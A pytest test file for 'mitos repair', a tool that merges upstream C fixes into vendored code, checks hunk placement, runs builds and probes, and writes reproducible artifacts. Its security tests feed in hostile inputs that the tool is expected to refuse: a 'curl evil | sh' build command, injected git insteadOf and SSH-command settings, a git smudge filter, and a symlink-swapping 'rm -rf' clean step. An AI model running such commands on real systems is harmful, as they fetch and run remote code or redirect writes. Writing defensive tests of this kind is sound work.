"""Certification-integrity tests for `mitos repair`.

Covers, on top of the earlier passes:
  * the recipe boundary — run_repair takes a KEY resolved to an internal factory; a caller Recipe
    (even same-key with a mutated build_cmd) cannot execute;
  * non-destructive run dirs (a valuable --work parent is never removed), probe inputs written from
    bytes O_NOFOLLOW, artifacts staged + atomically renamed, existing output refused unless force;
  * positional verification incl. the preprocessor branch stack (macro under the wrong #if/#else
    branch with identical adjacent lines is unverified) and complete-context unique mapping;
  * the coverage invariant behavioural ⊆ reachable ⊆ modified with nonempty reachability;
  * byte-for-byte reproducibility of all five artifacts across two runs in different directories.

Hermetic: throwaway git repos, tiny C programs, no network, no frozen-corpus contact."""
import json
import os
import subprocess
import tempfile
import time
import types

import pytest

from mitos import applyfix, repair
from mitos.repair import Log, Git, three_way_merge, verify_hunks, decide, count_patch_hunks

HAVE_CC = subprocess.run(["cc", "--version"], capture_output=True).returncode == 0


# --------------------------------------------------------------------------- helpers
def _git(d, *a):
    subprocess.run(["git", "-C", d, *a], capture_output=True, text=True)


def _head(d):
    return subprocess.run(["git", "-C", d, "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()


def _init(d):
    _git(d, "init", "-q", "-b", "main"); _git(d, "config", "user.email", "t@t"); _git(d, "config", "user.name", "t")


def _git_patch(base_text, other_text, fname="f.c"):
    d = tempfile.mkdtemp(); _init(d)
    open(f"{d}/{fname}", "w").write(base_text); _git(d, "add", fname); _git(d, "commit", "-qm", "b")
    open(f"{d}/{fname}", "w").write(other_text); _git(d, "add", fname); _git(d, "commit", "-qm", "o")
    return subprocess.run(["git", "-C", d, "diff", "HEAD~1", "HEAD", "--", fname],
                          capture_output=True, text=True).stdout


def _merge(current, base, other):
    with tempfile.TemporaryDirectory() as d:
        return three_way_merge(Git(Log(), d), d, current, base, other)


def _cc(src, out):
    open(out + ".c", "w").write(src)
    r = subprocess.run(["cc", "-O0", "-w", out + ".c", "-o", out], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    return out


def _checks(base, other, current, merged, n=0):
    return verify_hunks(_git_patch(base, other), other, current, merged, n)


# a two-loader library with filler + a drifted downstream copy
BASE = ("static int foo(ctx *s) {\n    int a = 1;\n    int w = rd(s);\n    return alloc(w);\n}\n\n"
        "static int mid_one(void) { return 1; }\nstatic int mid_two(void) { return 2; }\n\n"
        "static int bar(ctx *s) {\n    int a = 1;\n    int h = rd(s);\n    return alloc(h);\n}\n")
OTHER = ("static int foo(ctx *s) {\n    int a = 1;\n    int w = rd(s);\n"
         "    if (w > MAXLIMIT) return oops(\"too large\");\n    return alloc(w);\n}\n\n"
         "static int mid_one(void) { return 1; }\nstatic int mid_two(void) { return 2; }\n\n"
         "static int bar(ctx *s) {\n    int a = 1;\n    int h = rd(s);\n"
         "    if (h > MAXLIMIT) return oops(\"too large\");\n    return alloc(h);\n}\n")
CURRENT = ("// vendored, drifted\nstatic int unrelated(ctx *s) { return 0; }\n\n"
           "static int foo(ctx *s) {\n    int a = 1;\n    int w = rd(s);\n    return alloc(w);\n}\n\n"
           "static int mid_one(void) { return 1; }\nstatic int mid_two(void) { return 2; }\n\n"
           "static int bar(ctx *s) {\n    int a = 1;\n    int h = rd(s);\n    return alloc(h);\n}\n")


# --------------------------------------------------------------------------- merge + hunk count
def test_three_way_merge_applies_on_drift_and_is_clean():
    merged, n, rc = _merge(CURRENT, BASE, OTHER)
    assert n == 0 and rc == 0 and merged.count("if (w > MAXLIMIT)") == 1 and merged.count("if (h > MAXLIMIT)") == 1


def test_three_way_merge_conflict_sets_rc():
    collide = CURRENT.replace("    return alloc(w);\n}", "    return alloc(w + 1);\n}", 1)
    other2 = OTHER.replace("    return alloc(w);\n}", "    return alloc(w * 2);\n}", 1)
    merged, n, rc = _merge(collide, BASE, other2)
    assert n >= 1 and rc >= 1 and "<<<<<<<" in merged


def test_hunk_count_matches_patch():
    patch = _git_patch(BASE, OTHER)
    assert count_patch_hunks(patch) == len(repair._parse_hunks(patch)) == 2


# --------------------------------------------------------------------------- positional verification
def test_verify_positional_applied_on_drift():
    merged, n, _ = _merge(CURRENT, BASE, OTHER)
    by = {c.actual_scope: c for c in _checks(BASE, OTHER, CURRENT, merged, n)}
    assert by["foo"].verified and by["foo"].status == "applied" and by["foo"].anchored
    assert by["bar"].verified and by["bar"].anchored


def test_verify_rejects_guard_after_return_wrong_position():
    bad = CURRENT.replace("    return alloc(w);\n}",
                          "    return alloc(w);\n    if (w > MAXLIMIT) return oops(\"too large\");\n}", 1)
    foo = next(c for c in _checks(BASE, OTHER, CURRENT, bad) if c.sample.startswith("if (w >"))
    assert "if (w > MAXLIMIT)" in bad and foo.status == "wrong_position" and not foo.verified


def test_verify_rejects_edit_on_second_of_two_identical_calls():
    base = "static int f(ctx *s) {\n    int a = 1;\n    emit(s);\n    step();\n    emit(s);\n    return 0;\n}\n"
    other = ("static int f(ctx *s) {\n    int a = 1;\n    guard(s);\n    emit(s);\n    step();\n"
             "    emit(s);\n    return 0;\n}\n")
    merged = ("static int f(ctx *s) {\n    int a = 1;\n    emit(s);\n    step();\n"
              "    guard(s);\n    emit(s);\n    return 0;\n}\n")
    c = _checks(base, other, base, merged)[0]
    assert c.status == "wrong_position" and not c.verified


def test_verify_rejects_macro_under_wrong_branch_with_identical_adjacent_lines():
    # both branches have IDENTICAL lines on BOTH sides of the insertion point, so the immediate
    # anchors match either way — only the #if/#else branch STACK distinguishes them. The macro
    # landing under #else (upstream put it under #ifdef FEATURE_A) must be unverified.
    base = ("#ifndef LIB_H\n#define LIB_H\n#ifdef FEATURE_A\n    int x;\n    int y;\n"
            "#else\n    int x;\n    int y;\n#endif\n#endif\n")
    other = ("#ifndef LIB_H\n#define LIB_H\n#ifdef FEATURE_A\n    int x;\n#define LIB_MAX 8\n    int y;\n"
             "#else\n    int x;\n    int y;\n#endif\n#endif\n")
    merged = ("#ifndef LIB_H\n#define LIB_H\n#ifdef FEATURE_A\n    int x;\n    int y;\n"
              "#else\n    int x;\n#define LIB_MAX 8\n    int y;\n#endif\n#endif\n")   # macro under #else
    c = next(x for x in _checks(base, other, base, merged) if "LIB_MAX" in x.sample)
    assert not c.verified and c.status == "wrong_branch"


def test_verify_rejects_replacement_when_obsolete_line_remains():
    base = "static int f(ctx *s) {\n    int a = 1;\n    return old_api(s);\n}\n"
    other = "static int f(ctx *s) {\n    int a = 1;\n    return new_api(s);\n}\n"
    merged = "static int f(ctx *s) {\n    int a = 1;\n    return new_api(s);\n    return old_api(s);\n}\n"
    c = _checks(base, other, base, merged)[0]
    assert not c.verified and c.status == "obsolete_remains"


def test_verify_already_present_requires_full_postimage_and_removal():
    base = "static int f(ctx *s) {\n    int a = 1;\n    return old_api(s);\n}\n"
    other = "static int f(ctx *s) {\n    int a = 1;\n    return new_api(s);\n}\n"
    c = _checks(base, other, other, other)[0]
    assert c.verified and c.status == "already_present"


def test_verify_file_scope_macro_reported_at_file_scope():
    base = "static int avail(void) { return 1; }\nstatic int use(ctx *s){ return rd(s); }\n"
    other = ("static int avail(void) { return 1; }\n\n#ifndef LIB_MAX\n#define LIB_MAX 16\n#endif\n\n"
             "static int use(ctx *s){ return rd(s); }\n")
    merged, n, _ = _merge(base, base, other)
    mac = next(c for c in _checks(base, other, base, merged, n) if c.added >= 2)
    assert mac.nature == "preproc_or_comment" and mac.actual_scope == "file-scope" and mac.verified


def test_difflib_anchor_drops_file_scope_macro_that_merge_applies():
    base = "#ifdef LIB_IMPLEMENTATION\nstatic int avail(void) { return 1; }\nstatic int use(ctx *s){ return rd(s); }\n#endif\n"
    other = ("#ifdef LIB_IMPLEMENTATION\nstatic int avail(void) { return 1; }\n\n"
             "#ifndef LIB_MAXDIM\n#define LIB_MAXDIM 16\n#endif\n\nstatic int use(ctx *s){ return rd(s); }\n#endif\n")
    current = "// drifted copy\n" + base
    import difflib
    patch = applyfix._annotate_hunk_funcs(
        "".join(difflib.unified_diff(base.splitlines(keepends=True), other.splitlines(keepends=True),
                                     fromfile="a/f.c", tofile="b/f.c")), base)
    patched, sites, _ = applyfix.apply_fix(current, patch, frozenset())
    merged, n, _ = _merge(current, base, other)
    assert "#define LIB_MAXDIM" in merged and "#define LIB_MAXDIM" not in patched
    assert any(s.status == "skipped" for s in sites)


# --------------------------------------------------------------------------- pure verdict + invariant
def _ok(**over):
    d = dict(parent_verified=True, origin_ok=True, clone_validated=True, generator_clean=True,
             hunk_count_ok=True, merge_rc=0, n_conflicts=0, hunks=[{"status": "applied", "verified": True}],
             baseline={"ok": True, "status": "ok"}, patched={"ok": True, "status": "ok"},
             probes=[{"ok": True}], modified_loaders=["BMP", "PNM"], reachable_loaders=["BMP"],
             behavioural_loaders=["BMP"], golden_attested=True, golden_ok=True)
    d.update(over)
    return d


def test_decide_verified_when_all_reachable_exercised():
    assert decide(**_ok())[0] == "VERIFIED"


def test_decide_scoped_when_reachable_not_fully_exercised():
    v, r = decide(**_ok(modified_loaders=["BMP", "PNG", "PNM"], reachable_loaders=["BMP", "PNG"],
                        behavioural_loaders=["BMP"]))
    assert v == "VERIFIED_SCOPED" and "not exercised: PNG" in r[0]


@pytest.mark.parametrize("over,needle", [
    ({"baseline": {"ok": False, "status": "clean_failed"}}, "baseline"),
    ({"baseline": {"ok": False, "status": "stale_artifact"}}, "baseline"),
    ({"baseline": {"ok": False, "status": "source_overwritten"}}, "baseline"),
    ({"patched": {"ok": False, "status": "timeout"}}, "patched"),
    ({"merge_rc": 1}, "merge returned 1"),
    ({"n_conflicts": 2}, "conflict"),
    ({"hunk_count_ok": False}, "hunk count"),
    ({"parent_verified": False}, "parent"),
    ({"clone_validated": False}, "clone failed"),
    ({"generator_clean": False}, "generator tree is dirty"),
    # positional verification gates only when there is no golden postimage to defer to
    ({"hunks": [{"status": "wrong_branch", "verified": False}],
      "golden_attested": False, "golden_ok": False}, "not verified"),
    ({"probes": [{"ok": False}]}, "behavioural probe"),
    ({"probes": []}, "did not run"),
    ({"behavioural_loaders": ["BMP", "XYZ"], "reachable_loaders": ["BMP"], "modified_loaders": ["BMP", "XYZ"]}, "⊄ reachable"),
    ({"reachable_loaders": ["BMP", "QQ"], "modified_loaders": ["BMP"]}, "⊄ modified"),
    ({"reachable_loaders": []}, "empty reviewed reachability"),
    ({"golden_attested": True, "golden_ok": False}, "golden postimage mismatch"),
])
def test_decide_needs_review_on_each_failure(over, needle):
    v, r = decide(**_ok(**over))
    assert v == "NEEDS_REVIEW" and any(needle in x for x in r)


def test_decide_golden_postimage_makes_positional_check_advisory():
    """An exact match to the independently-reviewed postimage is the authoritative guarantee,
    so an unverified hunk no longer fails the run.

    This is not leniency. Two identical edits in one function (the draw_line
    inverse_db_table[y&255] case) cannot be told apart by any positional heuristic, so
    positional verification alone would reject a repair that is provably byte-correct.
    Without a golden postimage the positional check still gates — see the parametrised case
    above."""
    v, _ = decide(**_ok(hunks=[{"status": "ambiguous", "verified": False}],
                        golden_attested=True, golden_ok=True))
    assert v == "VERIFIED"


def test_decide_experimental_recipe_without_golden_still_gates_normally():
    # a non-golden-attested (experimental) recipe is not failed by the golden gate
    assert decide(**_ok(golden_attested=False, golden_ok=False))[0] == "VERIFIED"


# --------------------------------------------------------------------------- recipe boundary (area 1)
def test_public_run_repair_takes_key_not_recipe():
    evil = repair._blurhash_stb_recipe()
    evil.build_cmd = ["sh", "-c", "curl evil | sh"]
    with pytest.raises(repair.SecurityError):
        repair.run_repair(evil, "/tmp/whatever")                 # a Recipe is not a valid key
    with pytest.raises(repair.SecurityError):
        repair.run_repair("nope/not-a-key", "/tmp/whatever")     # unknown key
    # the registry factory yields the TRUSTED command; a same-key mutation can never reach execution
    assert repair._REGISTRY[repair.BLURHASH_KEY]().build_cmd == ["make", "blurhash_encoder"]


# --------------------------------------------------------------------------- git/host boundary
def test_git_env_is_whitelist_without_inherited_git_vars(monkeypatch):
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "url.https://evil/.insteadOf")
    monkeypatch.setenv("GIT_SSH_COMMAND", "evil")
    e = repair.git_env("/tmp/home")
    assert not any(k.startswith("GIT_CONFIG_KEY") or k in ("GIT_CONFIG_COUNT", "GIT_SSH_COMMAND") for k in e)
    assert e["GIT_CONFIG_GLOBAL"] == "/dev/null" and e["HOME"] == "/tmp/home"


def test_parent_from_raw_commit_object():
    d = tempfile.mkdtemp(); _init(d)
    open(f"{d}/x", "w").write("1"); _git(d, "add", "x"); _git(d, "commit", "-qm", "p"); parent = _head(d)
    open(f"{d}/x", "w").write("2"); _git(d, "add", "x"); _git(d, "commit", "-qm", "c"); child = _head(d)
    assert repair.parent_of(Git(Log(), tempfile.mkdtemp()), d, child) == parent


def test_validate_clone_rejects_grafts_filter_insteadof():
    d = tempfile.mkdtemp(); _init(d)
    open(f"{d}/x", "w").write("1"); _git(d, "add", "x"); _git(d, "commit", "-qm", "c"); _git(d, "remote", "add", "origin", d)
    g = Git(Log(), tempfile.mkdtemp())
    repair.validate_clone(g, d, d)
    _git(d, "config", "filter.evil.smudge", "cat")
    with pytest.raises(repair.SecurityError):
        repair.validate_clone(g, d, d)
    _git(d, "config", "--unset", "filter.evil.smudge")
    _git(d, "config", "url.https://evil/.insteadOf", "https://github.com/")
    with pytest.raises(repair.SecurityError):
        repair.validate_clone(g, d, d)
    _git(d, "config", "--unset", "url.https://evil/.insteadOf")
    os.makedirs(f"{d}/.git/info", exist_ok=True); open(f"{d}/.git/info/grafts", "w").write("x")
    with pytest.raises(repair.SecurityError):
        repair.validate_clone(g, d, d)


def test_safe_subpath_and_excl_write_reject_symlink():
    with tempfile.TemporaryDirectory() as root:
        with pytest.raises(repair.SecurityError):
            repair.safe_subpath(root, "../escape")
        os.symlink("/etc/hosts", f"{root}/link")
        with pytest.raises(repair.SecurityError):
            repair.safe_subpath(root, "link")
        with pytest.raises(OSError):                    # O_EXCL|O_NOFOLLOW refuses a symlinked path
            repair._excl_write(f"{root}/link", b"x")


# --------------------------------------------------------------------------- build provenance (area 1 old + 2)
def _build_recipe(build_cmd, clean_cmd=("true",), artifact="prog", path="src/hdr.h", subdir="src"):
    return types.SimpleNamespace(downstream_path=path, build_subdir=subdir, build_artifact=artifact,
                                 clean_cmd=list(clean_cmd), build_cmd=list(build_cmd))


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_build_fresh_artifact_hashed_not_stale_dummy():
    with tempfile.TemporaryDirectory() as wt:
        os.makedirs(f"{wt}/src"); open(f"{wt}/src/hdr.h", "w").write("// x")
        open(f"{wt}/src/prog.c", "w").write("int main(){return 0;}\n")
        open(f"{wt}/src/prog", "w").write("STALE"); stale = repair.sha256_file(f"{wt}/src/prog")
        res = repair.build_once(Log(), _build_recipe(["sh", "-c", "cc -O0 -o prog prog.c"]), wt, wt, "// hdr", f"{wt}/out")
        assert res.ok and res.status == "ok" and res.artifact_fresh and res.sha256 != stale and os.path.exists(res.binary)
        assert os.access(res.binary, os.X_OK)           # copied binary stays executable


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_build_stale_source_overwrite_clean_fail_timeout():
    with tempfile.TemporaryDirectory() as wt:
        os.makedirs(f"{wt}/src"); open(f"{wt}/src/hdr.h", "w").write("orig")
        open(f"{wt}/src/prog.c", "w").write("int main(){return 0;}\n")
        assert repair.build_once(Log(), _build_recipe(["true"], clean_cmd=["sh", "-c", "echo x > prog"]),
                                 wt, wt, "// h", f"{wt}/o0").status == "stale_artifact"
        assert repair.build_once(Log(), _build_recipe(["sh", "-c", "echo t >> hdr.h; cc -O0 -o prog prog.c"]),
                                 wt, wt, "// intended", f"{wt}/o1").status == "source_overwritten"
        assert repair.build_once(Log(), _build_recipe(["true"], clean_cmd=["false"]), wt, wt, "x", f"{wt}/o2").status == "clean_failed"
        r = repair.build_once(Log(), _build_recipe(["sh", "-c", "sleep 5"]), wt, wt, "x", f"{wt}/o3", timeout=2)
        assert not r.ok and r.status == "timeout" and r.timed_out
    with tempfile.TemporaryDirectory() as wt:                        # symlinked artifact -> not a regular file
        os.makedirs(f"{wt}/src"); open(f"{wt}/src/hdr.h", "w").write("x")
        os.symlink("/etc/hosts", f"{wt}/src/prog")
        r = repair.build_once(Log(), _build_recipe(["true"]), wt, wt, "x", f"{wt}/o4")
        assert not r.ok and r.status == "artifact_is_symlink"


# --------------------------------------------------------------------------- probe hardening (bytes + exact rc)
def _probe_recipe(*probes):
    return types.SimpleNamespace(probes=list(probes), run_argv=lambda b, inp: [b, inp])


def _mk(name, expectation, content=b"x", **kw):
    return repair.Probe(name, (lambda: content), name + ".in", expectation, **kw)


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_probe_reject_pass_crash_timeout_wrongcode_missingdiag():
    with tempfile.TemporaryDirectory() as d:
        before = _cc('#include <stdio.h>\nint main(){printf("HASH\\n");return 0;}', f"{d}/before")
        good = _cc('#include <stdio.h>\nint main(){fprintf(stderr,"Failed to load\\n");return 1;}', f"{d}/good")
        seg = _cc('int main(){int*p=0;*p=1;return 0;}', f"{d}/seg")
        hang = _cc('int main(){for(;;){}return 0;}', f"{d}/hang")
        wrong = _cc('#include <stdio.h>\nint main(){fprintf(stderr,"Failed to load\\n");return 2;}', f"{d}/wrong")
        nodiag = _cc('int main(){return 1;}', f"{d}/nodiag")
        spec = dict(loader="X", expect_exit_code=1, expect_diagnostic="Failed to load")
        run = lambda after: repair.run_probes(Log(), _probe_recipe(_mk("p", "rejected_after_only", **spec)),
                                              before, after, d, d, timeout=3)[0]
        assert run(good).ok
        assert not run(seg).ok and run(seg).after_signal
        assert not run(hang).ok and run(hang).after_timed_out
        assert not run(wrong).ok and not run(nodiag).ok


# --------------------------------------------------------------------------- FULL run_repair (_execute) over local repos
PARENT_LIB = ("#ifndef LIB_H\n#define LIB_H\nstatic int check_dims(int n) {\n"
              "    int ok = 1;\n    return ok ? n : -1;\n}\n#endif\n")
FIX_LIB = ("#ifndef LIB_H\n#define LIB_H\nstatic int check_dims(int n) {\n"
           "    int ok = 1;\n    if (n > 1000000) return -1;\n    return ok ? n : -1;\n}\n#endif\n")
PROG_C = ('#include "lib.h"\n#include <stdio.h>\nint main(int argc,char**argv){\n'
          '  FILE*f=fopen(argv[1],"r"); if(!f) return 2;\n  int n=0; if(fscanf(f,"%d",&n)!=1) n=0; fclose(f);\n'
          '  int r=check_dims(n);\n  if(r<0){ fprintf(stderr,"Failed to load\\n"); return 1; }\n'
          '  printf("OK %d\\n", r); return 0;\n}\n')


def _synth(root):
    up, dn = f"{root}/up", f"{root}/dn"
    os.makedirs(up); os.makedirs(f"{dn}/src")
    _init(up); open(f"{up}/lib.h", "w").write(PARENT_LIB); _git(up, "add", "lib.h"); _git(up, "commit", "-qm", "parent")
    parent = _head(up)
    open(f"{up}/lib.h", "w").write(FIX_LIB); _git(up, "add", "lib.h"); _git(up, "commit", "-qm", "guard")
    fix = _head(up)
    _init(dn); open(f"{dn}/src/lib.h", "w").write(PARENT_LIB); open(f"{dn}/src/prog.c", "w").write(PROG_C)
    _git(dn, "add", "-A"); _git(dn, "commit", "-qm", "vendor"); dsha = _head(dn)
    return up, fix, parent, dn, dsha


def _synth_recipe(up, fix, parent, dn, dsha, build_cmd=("sh", "-c", "cc -O2 -o prog prog.c"),
                  clean_cmd=("sh", "-c", "rm -f prog"), reachable=("NUM",), expected_merged=""):
    return repair.Recipe(
        key="test/synthetic", name="synthetic", upstream_repo=up, upstream_fix_sha=fix,
        upstream_parent_sha=parent, upstream_path="lib.h", downstream_repo=dn, downstream_sha=dsha,
        downstream_path="src/lib.h", build_subdir="src", build_cmd=list(build_cmd), clean_cmd=list(clean_cmd),
        build_artifact="prog", run_argv=lambda b, inp: [b, inp], marker="1000000",
        expected_merged_sha256=expected_merged,
        modified_loaders=sorted(set(reachable) | {"NUM"}), reachable_loaders=list(reachable),
        probes=[repair.Probe("normal", (lambda: b"5"), "n.in", "identical", loader="NUM"),
                repair.Probe("oversized", (lambda: b"99999999"), "big.in", "rejected_after_only",
                             loader="NUM", expect_exit_code=1, expect_diagnostic="Failed to load")])


@pytest.fixture
def clean_generator(monkeypatch):
    monkeypatch.setattr(repair, "_repo_head", lambda repo_dir, home: ("COMMIT_A", "TREE_A", True))


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_execute_end_to_end_verified(clean_generator, tmp_path):
    with tempfile.TemporaryDirectory() as root:
        rec = _synth_recipe(*_synth(root))
        res = repair._execute(rec, str(tmp_path / "work"))
        assert res.verdict == "VERIFIED", res.reasons
        assert res.parent_verified and res.clone_validated and res.hunk_count_ok and res.generator_clean
        assert all(h["verified"] for h in res.hunks) and res.baseline_build["ok"] and res.patched_build["ok"]
        assert res.coverage["behaviourally_verified_loaders"] == ["NUM"]


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_execute_scoped_and_stale_and_overwrite(clean_generator, tmp_path):
    with tempfile.TemporaryDirectory() as root:
        s = _synth(root)
        assert repair._execute(_synth_recipe(*s, reachable=("NUM", "OTHER")), str(tmp_path / "a")).verdict == "VERIFIED_SCOPED"
    with tempfile.TemporaryDirectory() as root:
        s = _synth(root)
        r = repair._execute(_synth_recipe(*s, build_cmd=["true"], clean_cmd=["sh", "-c", "echo x > prog"]), str(tmp_path / "b"))
        assert r.verdict == "NEEDS_REVIEW" and r.baseline_build["status"] == "stale_artifact"
    with tempfile.TemporaryDirectory() as root:
        s = _synth(root)
        r = repair._execute(_synth_recipe(*s, build_cmd=["sh", "-c", "echo '//t' >> lib.h; cc -O0 -o prog prog.c"]), str(tmp_path / "c"))
        assert r.verdict == "NEEDS_REVIEW" and r.baseline_build["status"] == "source_overwritten"


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_execute_never_removes_caller_work_parent(clean_generator, tmp_path):
    with tempfile.TemporaryDirectory() as root:
        rec = _synth_recipe(*_synth(root))
        work = tmp_path / "valuable"; work.mkdir(); (work / "keep.txt").write_text("precious")
        repair._execute(rec, str(work))
        assert (work / "keep.txt").read_text() == "precious"              # never rmtree'd
        assert any(p.name.startswith("mitos_run_") for p in work.iterdir())


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_execute_defeats_git_config_count_injection(clean_generator, monkeypatch, tmp_path):
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "url.https://127.0.0.1:1/.insteadOf")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", tempfile.gettempdir())
    with tempfile.TemporaryDirectory() as root:
        rec = _synth_recipe(*_synth(root))
        assert repair._execute(rec, str(tmp_path / "w")).verdict == "VERIFIED"


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_two_cold_runs_reproduce_byte_for_byte(clean_generator, tmp_path):
    with tempfile.TemporaryDirectory() as root:
        rec = _synth_recipe(*_synth(root))                                # same repos for both runs
        blobs = []
        for i in range(2):
            res = repair._execute(rec, str(tmp_path / f"work{i}"))
            out = tmp_path / f"out{i}"
            repair.write_artifacts(res, str(out))
            blobs.append({n: (out / n).read_bytes() for n in repair._ARTIFACT_NAMES})
        for n in repair._ARTIFACT_NAMES:
            assert blobs[0][n] == blobs[1][n], f"{n} not reproducible across run dirs"


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_reproduces_across_short_and_long_work_paths(clean_generator, tmp_path):
    with tempfile.TemporaryDirectory() as root:
        rec = _synth_recipe(*_synth(root))
        short = tmp_path / "s"
        longp = tmp_path / ("d" * 90) / ("e" * 90)          # deliberately long work path
        longp.mkdir(parents=True)
        blobs = []
        for i, wp in enumerate((short, longp)):
            res = repair._execute(rec, str(wp))
            out = tmp_path / f"o{i}"
            repair.write_artifacts(res, str(out))
            blobs.append({n: (out / n).read_bytes() for n in repair._ARTIFACT_NAMES})
        for n in repair._ARTIFACT_NAMES:
            assert blobs[0][n] == blobs[1][n], f"{n} differs across short vs long work path"


# --------------------------------------------------------------------------- golden attestation (area 1)
@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_execute_golden_gate_rejects_wrong_postimage(clean_generator, tmp_path):
    # a golden-attested recipe whose expected postimage differs from the actual (clean) merge —
    # i.e. a clean-but-wrongly-positioned merge — becomes NEEDS_REVIEW through the golden gate.
    with tempfile.TemporaryDirectory() as root:
        rec = _synth_recipe(*_synth(root), expected_merged="0" * 64)
        res = repair._execute(rec, str(tmp_path / "w"))
        assert res.verdict == "NEEDS_REVIEW" and any("golden postimage mismatch" in r for r in res.reasons)
        assert res.golden_attestation["attested"] and res.golden_attestation["merged_match"] is False


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_execute_golden_gate_accepts_matching_postimage(clean_generator, tmp_path):
    with tempfile.TemporaryDirectory() as root:
        s = _synth(root)
        golden = repair._execute(_synth_recipe(*s), str(tmp_path / "w0")).hashes["merged"]   # from a PRIOR run
        res = repair._execute(_synth_recipe(*s, expected_merged=golden), str(tmp_path / "w1"))
        assert res.verdict == "VERIFIED" and res.golden_attestation["merged_match"] is True


# --------------------------------------------------------------------------- mechanical safety (area 3/4)
def test_repo_head_fails_closed_on_non_git_dir():
    commit, tree, clean = repair._repo_head(tempfile.mkdtemp(), tempfile.mkdtemp())
    assert commit == "" and tree == "" and clean is False


def test_write_at_refuses_dir_symlink_component():
    with tempfile.TemporaryDirectory() as root:
        os.symlink("/tmp", os.path.join(root, "evil"))
        with pytest.raises(repair.SecurityError):
            repair._write_at(root, "evil/x", b"data")


@pytest.mark.skipif(not HAVE_CC, reason="cc required")
def test_build_clean_cannot_redirect_write_through_dir_symlink(tmp_path):
    wt = str(tmp_path / "wt"); os.makedirs(f"{wt}/src")
    open(f"{wt}/src/hdr.h", "w").write("orig"); open(f"{wt}/src/prog.c", "w").write("int main(){return 0;}\n")
    victim = tmp_path / "victim"; victim.mkdir()
    home = str(tmp_path / "home"); os.makedirs(home)
    # clean cd's up out of src, then swaps src for a symlink to victim
    rec = _build_recipe(["true"], clean_cmd=["sh", "-c", f"cd .. && rm -rf src && ln -s {victim} src"])
    with pytest.raises(repair.SecurityError):                    # dirfd O_NOFOLLOW refuses the swapped dir
        repair.build_once(Log(), rec, wt, home, "// intended", str(tmp_path / "out"))
    assert not (victim / "hdr.h").exists()                      # nothing written through the symlink


def test_constrained_run_kills_background_child_on_success(tmp_path):
    marker = tmp_path / "marker"
    home = str(tmp_path / "home"); os.makedirs(home)
    # the leader exits 0 immediately but leaves a background child that would touch marker after 2s
    repair.constrained_run(Log(), ["sh", "-c", f"( sleep 2; : > '{marker}' ) & echo ok"], str(tmp_path), home, timeout=10)
    time.sleep(3)
    assert not marker.exists()                                  # the whole group was killed after success


# --------------------------------------------------------------------------- artifacts (staging/refuse/force)
def _fake_result(verdict="VERIFIED_SCOPED", reasons=None):
    return repair.RepairResult(
        recipe="t", recipe_digest="d" * 64, generator_commit="c" * 40, generator_tree="e" * 40,
        generator_clean=True, verification_command="python -m mitos repair",
        execution_model="constrained host execution",
        upstream={"repo": "u", "fix": "f" * 40, "parent_expected": "p" * 40, "parent_actual": "p" * 40, "path": "x.h"},
        downstream={"repo": "d", "sha": "s" * 40, "path": "C/x.h", "current_lines": 10},
        parent_verified=True, origin_ok=True, clone_validated=True, hunk_count_ok=True,
        merge={"tool": "git merge-file --diff3", "returncode": 0, "conflicts": 0, "clean": True,
               "merged_lines": 10, "marker": "M", "marker_before": 0, "marker_after": 9},
        golden_attestation={"attested": True, "expected_merged_sha256": "d" * 64, "actual_merged_sha256": "d" * 64,
                            "merged_match": True, "expected_fix_diff_sha256": "9" * 64,
                            "actual_fix_diff_sha256": "9" * 64, "fix_diff_match": True, "note": "golden"},
        hunks=[{"header_function": "bmp", "actual_scope": "bmp", "nature": "statement", "added": 1, "removed": 0,
                "matched_regions": 1, "removal_ok": True, "anchored": True, "status": "applied",
                "verified": True, "sample": "if"}],
        hunk_certification={"upstream_hunks": 11, "verified": 11, "verified_applied": 11, "already_present": 0,
                            "unverified": [], "claim": "clean three-way merge; 11/11 positionally verified"},
        coverage={"structurally_merged_loaders": ["JPEG", "PNG", "BMP", "TGA", "PSD", "PIC", "GIF", "HDR", "PNM"],
                  "structurally_merged_count": 9, "reachable_loaders": ["BMP", "PNG", "PSD", "HDR", "PNM"],
                  "reachable_count": 5, "behaviourally_verified_loaders": ["BMP", "PNM"],
                  "behaviourally_verified_count": 2, "invariant": "behavioural ⊆ reachable ⊆ modified",
                  "note": "PNG already rejected > 1<<24 ... newly-default paths BMP, PSD, HDR, PNM (2/4)."},
        baseline_build={"ok": True, "status": "ok", "artifact_fresh": True, "sha256": "a" * 64},
        patched_build={"ok": True, "status": "ok", "artifact_fresh": True, "sha256": "b" * 64},
        probes=[{"name": "oversized BMP", "loader": "BMP", "expectation": "rejected_after_only",
                 "ok": True, "detail": "before rc=0; after rc=1"}],
        verdict=verdict, reasons=reasons or ["behavioural coverage is scoped: 2/5 reachable loaders exercised; not exercised: PNG, PSD, HDR"],
        hashes={"merged": "d" * 64, "encoder_after": "b" * 64}, toolchain={"cc": "clang", "git": "git 2"},
        fix_diff="--- a\n+++ b\n", path_tokens={"/tmp/xyz/run": "$RUN"},
        commands=[{"argv": ["git", "-C", "/tmp/xyz/run"], "cwd": "/tmp/xyz/run", "returncode": 0,
                   "stdout": "ok /tmp/xyz/run", "stderr": "", "timed_out": False, "label": "git",
                   "stdout_total": 12, "stderr_total": 0, "truncated": False}])


def test_write_artifacts_sanitises_records_provenance_and_refuses_existing():
    res = _fake_result()
    with tempfile.TemporaryDirectory() as d:
        repair.write_artifacts(res, d)
        for name in repair._ARTIFACT_NAMES:
            assert os.path.exists(os.path.join(d, name))
        ev = json.load(open(os.path.join(d, "evidence.json")))
